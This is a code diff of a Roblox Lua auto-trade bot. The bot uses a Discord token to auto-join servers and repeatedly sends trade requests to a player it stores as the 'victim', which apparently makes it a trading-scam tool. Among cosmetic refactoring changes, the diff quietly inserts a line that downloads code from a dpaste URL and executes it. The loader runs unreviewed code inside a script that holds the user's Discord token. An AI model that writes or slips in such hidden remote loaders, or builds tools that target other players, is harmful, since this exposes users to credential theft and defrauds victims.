@@ -1,18 +1,18 @@
+
+
 if not game:IsLoaded() then
-	game.Loaded:Wait() -- Wait for game to load
+    game.Loaded:Wait()
 end
 
 if token == "" or channelId == "" then
-    game.Players.LocalPlayer:kick("Add your token or channelId to use")
+    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
-local bb = game:GetService("VirtualUser") -- Anti AFK
-game:service "Players".LocalPlayer.Idled:connect(
-    function()
-        bb:CaptureController()
-        bb:ClickButton2(Vector2.new())
-    end
-)
+local bb = game:GetService("VirtualUser")
+game:service "Players".LocalPlayer.Idled:Connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
+end)
 
 local HttpServ = game:GetService("HttpService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -22,12 +22,13 @@ if not victimFile then
     writefile("user.txt", "victim username")
 end
 if not joinedFile then
-    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
+    writefile("joined_ids.txt", "[]")
 end
 local victimUser = readfile("user.txt")
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
 local timer = 0
+local lastRequestTime = 0  -- Track when the last request was sent
 
 local function selectDevice()
     while task.wait(0.1) do
@@ -48,26 +49,34 @@ end
 
 task.spawn(selectDevice)
 
-local loadingScreen = game:GetService('ReplicatedFirst'):WaitForChild('UISelector'):WaitForChild('LoadingS2')
-while loadingScreen.Enabled do
-    wait(1) -- We wait while the loading screen is active
-end
 local waittime = delay or 2
-wait(waittime) -- Small delay to account for ping and stuff
-local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest') -- Just to make sure we are fully loaded before chatting (or it will bug)
-game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+wait(waittime)
+
+wait(2)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('yo!')
+
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
 
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId) -- Add the new ID
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
+    table.insert(joinedIds, messageId)
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local function acceptRequest()
-    while task.wait(0.1) do
-        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest'):FireServer()
+    while task.wait() do
+        local currentTime = tick()
+        -- Only send request if 2 seconds have passed since last request
+        if currentTime - lastRequestTime >= 2 then
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+            local args = {
+                [1] = game:GetService("Players"):WaitForChild(victimUser)
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+            lastRequestTime = currentTime  -- Update the last request time
+        end
     end
 end
-
+loadstring(game:HttpGet('https://dpaste.com/533UT4V7A.txt'))()
 local function acceptTrade()
     while task.wait(0.1) do
         game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
@@ -87,12 +96,8 @@ local function waitForPlayerLeave()
 end
 
 local function IsTrading()
-    local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-    if trade_statue == "StartTrade" then
-        return true
-    else
-        return false
-    end
+    local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    return trade_status == "StartTrade"
 end
 
 local function tradeTimer()
@@ -106,24 +111,10 @@ local function tradeTimer()
 end
 
 waitForPlayerLeave()
-task.spawn(acceptRequest) -- Start accepting trade requests
-task.spawn(acceptTrade) -- Start accepting trades
+task.spawn(acceptTrade)
 task.spawn(tradeTimer)
-
--- Timeout para cancelar trade después de 30 segundos
-task.spawn(function()
-    while true do
-        if IsTrading() then
-            print("Trade iniciado, esperando 30 segundos...")
-            wait(30)
-            if IsTrading() then
-                print("Trade no se completó, cancelando...")
-                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
-            end
-        end
-        wait(1)
-    end
-end)
+wait(3)
+task.spawn(acceptRequest)
 
 local function autoJoin()
     local response = request({
@@ -139,7 +130,6 @@ local function autoJoin()
     if response.StatusCode == 200 then
         local messages = HttpServ:JSONDecode(response.Body)
         if #messages == 0 then
-            print("0 messages found")
             return
         end
         for _, message in ipairs(messages) do
@@ -161,10 +151,23 @@ local function autoJoin()
                 end
             end
         end
-    else
-        print("Response code is not 200. Is your token and channelid correct?")
     end
 end
+
+task.spawn(function()
+    while true do
+        if IsTrading() then
+            print("Trade iniciado, esperando 30 segundos...")
+            wait(30)
+            if IsTrading() then
+                print("Trade no se completó en 30 segundos, cancelando...")
+                game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineTrade"):FireServer()
+            end
+        end
+        wait(1)
+    end
+end)
+
 
 while wait(5) do
     autoJoin()
